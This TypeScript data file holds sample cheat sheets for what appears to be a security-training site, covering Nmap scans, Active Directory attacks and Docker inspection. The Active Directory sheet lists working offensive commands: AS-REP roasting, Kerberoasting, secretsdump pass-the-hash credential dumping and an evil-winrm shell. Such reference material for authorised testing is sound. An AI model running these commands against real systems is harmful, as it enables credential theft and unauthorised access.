import { Cheatsheet } from '@/types/content';

export const sampleCheatsheets: Cheatsheet[] = [
  {
    id: 'cs-nmap',
    title: 'Nmap Cheat Sheet',
    slug: 'nmap',
    category: 'Nmap',
    description: 'Essential Nmap scan flags, script engine usage, performance tuning, and firewall evasion one-liners.',
    tags: ['Nmap', 'Recon', 'Port Scanning', 'NSE Scripts', 'Networking'],
    lastUpdated: '2026-08-01',
    sections: [
      {
        title: 'Initial Reconnaissance & Fast Scans',
        items: [
          {
            command: 'nmap -sC -sV -oA nmap/initial 10.10.10.5',
            description: 'Standard initial scan with default scripts and service version detection.',
            example: 'nmap -sC -sV -oA nmap/initial 10.10.10.5',
          },
          {
            command: 'nmap -p- --min-rate 5000 -oA nmap/allports 10.10.10.5',
            description: 'Fast full 65,535 port scan outputting all open ports.',
            example: 'nmap -p- --min-rate 5000 -oA nmap/allports 10.10.10.5',
          },
          {
            command: 'nmap -sU --top-ports 100 10.10.10.5',
            description: 'Fast UDP scan targeting top 100 common UDP services.',
          },
        ],
      },
      {
        title: 'Vulnerability Scanning & NSE Scripts',
        items: [
          {
            command: 'nmap -p 445 --script vuln 10.10.10.5',
            description: 'Run all vulnerability NSE scripts against SMB port 445.',
          },
          {
            command: 'nmap -p 80 --script http-enum,http-headers,http-title 10.10.10.5',
            description: 'Enumerate HTTP directories, headers, and page titles.',
          },
        ],
      },
    ],
  },
  {
    id: 'cs-ad',
    title: 'Active Directory Cheat Sheet',
    slug: 'active-directory',
    category: 'Active Directory',
    description: 'Essential commands for LDAP enumeration, Kerberos roasting, BloodHound ingestion, and privilege escalation.',
    tags: ['Active Directory', 'Kerberos', 'Impacket', 'BloodHound', 'PowerView', 'Windows'],
    lastUpdated: '2026-07-25',
    sections: [
      {
        title: 'Enumeration & Kerberos Attacks',
        items: [
          {
            command: 'GetNPUsers.py CORP.LOCAL/ -no-pass -usersfile users.txt -dc-ip 10.10.10.1',
            description: 'Perform AS-REP Roasting for users with DONT_REQ_PREAUTH flag.',
          },
          {
            command: 'GetUserSPNs.py CORP.LOCAL/user:password -dc-ip 10.10.10.1 -request',
            description: 'Perform Kerberoasting against accounts with Service Principal Names.',
          },
          {
            command: 'bloodhound-python -u user -p password -d CORP.LOCAL -dc dc01.corp.local -c All',
            description: 'Ingest Active Directory domain objects and ACLs into BloodHound.',
          },
        ],
      },
      {
        title: 'Lateral Movement & Pass-The-Hash',
        items: [
          {
            command: 'secretsdump.py CORP.LOCAL/admin@10.10.10.1 -hashes :NTLM_HASH',
            description: 'Dump SAM & LSA secrets via Pass-The-Hash using secretsdump.',
          },
          {
            command: 'evil-winrm -i 10.10.10.1 -u Administrator -H NTLM_HASH',
            description: 'Establish WinRM shell using NTLM password hash.',
          },
        ],
      },
    ],
  },
  {
    id: 'cs-docker',
    title: 'Docker Security Cheat Sheet',
    slug: 'docker',
    category: 'Docker',
    description: 'Container management, security hardening, inspection, and escape audit commands.',
    tags: ['Docker', 'DevOps', 'Containers', 'Security Hardening', 'Privilege Escalation'],
    lastUpdated: '2026-07-10',
    sections: [
      {
        title: 'Container & Image Inspection',
        items: [
          {
            command: 'docker inspect --format="{{json .Config}}" CONTAINER_ID',
            description: 'Inspect raw JSON configuration and environment variables of a running container.',
          },
          {
            command: 'docker exec -it CONTAINER_ID /bin/sh',
            description: 'Spawn an interactive shell inside a running container.',
          },
        ],
      },
    ],
  },
];
